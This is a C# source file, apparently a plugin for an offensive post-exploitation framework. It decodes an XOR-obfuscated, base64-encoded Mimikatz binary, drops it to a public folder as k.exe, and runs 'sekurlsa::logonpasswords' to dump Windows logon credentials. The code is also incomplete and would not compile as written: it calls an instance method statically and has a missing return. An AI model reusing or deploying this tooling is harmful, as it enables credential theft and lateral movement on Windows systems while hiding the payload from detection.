namespace mimikatz;
//namespace chromeopener;
using System.Diagnostics;
using System.IO;
using System.Collections.Generic;

class MimikatzPlugin{

    public static IDictionary<string, dynamic> PluginMain(){
        string temppath = Path.GetTempFileName();

        Mimi.RunMimiKatz("sekurlsa::logonpasswords");
    }
}

class Mimi {
    //a class that represents all interactions with the mimikatz executable
    private string? mimiInst {get;set;}
    public Mimi () 
    {
        //mimikatz in base64
        this.mimiInst = LoadMimiKatz();

        //if mimikatz was not loaded, exit
        if (this.mimiInst == null){
            System.Environment.Exit(1);
        }
    }
    private string? LoadMimiKatz()
    {
        //load mimikatz from a file
        //maybe this should package mimikatz too?
        StreamReader reader = File.OpenText("m64.txt");
        try {
            string? m = reader.ReadLine();
            return CryptXOR(11, m); 
        } catch (Exception e) {
            Console.WriteLine("Exception loading mimikatz: " + e);
            return null;
        }
    }

    public void RunMimiKatz(string pArgs){
        //convert mimikatz instance from base64
        byte[] kiwi = Convert.FromBase64String(this.mimiInst);
        Process m = new Process();
        string path = "C:\\Users\\Public\\Documents\\";
        //write mimikatz into a file (until we can load it in memory only)
        File.WriteAllBytes(path + "k.exe", kiwi);
        //set up to start mimikatz
        m.StartInfo.FileName = path + "k.exe";
        //exit is needed at the end of the arguments to ensure mimikatz exits
        m.StartInfo.Arguments = $"{pArgs} exit";
        m.StartInfo.UseShellExecute = false;
        m.StartInfo.RedirectStandardOutput = true;
        //start the process and write the output to a file
        m.Start();
        //ensures the process stops
        m.WaitForExit(1000);


    }

    private string CryptXOR(int key, string xor){
        char[] output = new char[xor.Length];
        int x = 0;
        foreach (char c in xor){
            output[x] = (char)(c ^ key);
            x++;
        }
        return new string(output);
    }

    private string ParseOut(string line){
        //parse the output of mimikatz
        string[] test = line.Split('\n');

        //check for errors
        foreach (string str in test){
            if (str.Contains("ERROR")){
                if (str.Contains("Handle on memory")){
                    return "[+] ERROR: Mimikatz not running at high enough permissions";
                } else {
                    return "[+] ERROR: Unknown";
                }
            } 
        }
        //if no errors are found, return success
        return "[+] SUCCESS: Mimikatz Executed Properly";
    }
}
